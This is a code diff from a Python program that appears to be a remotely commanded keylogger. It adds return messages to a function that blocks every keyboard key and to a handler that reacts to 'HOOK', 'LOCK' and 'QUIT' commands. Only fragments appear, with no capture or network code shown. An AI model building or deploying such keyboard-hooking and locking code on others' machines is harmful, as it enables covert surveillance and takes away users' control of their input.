@@ -39,11 +39,12 @@ def lock():
         for i in range(150):
             keyboard.block_key(i)
         islock = 1
+        return "The keyboard is block"
     else:
         for i in range(150):
             keyboard.unblock_key(i)
         islock = 0
-    return
+    return "The keyboard is unblock"
 
 
 def keylog(client):
@@ -79,7 +80,7 @@ def keylog(msg):
     threading.Thread(target=listen).start()
     flag = 0
     cont = " "
-
+    msgRep = " "
     if "HOOK" in msg:
         if ishook == 0:
             flag = 1
@@ -88,7 +89,8 @@ def keylog(msg):
             flag = 2
             ishook = 0
     elif "LOCK" in msg:
-        lock()
+        msgRep = lock()
     elif "QUIT" in msg:
         flag = 4
         return
+    return msgRep
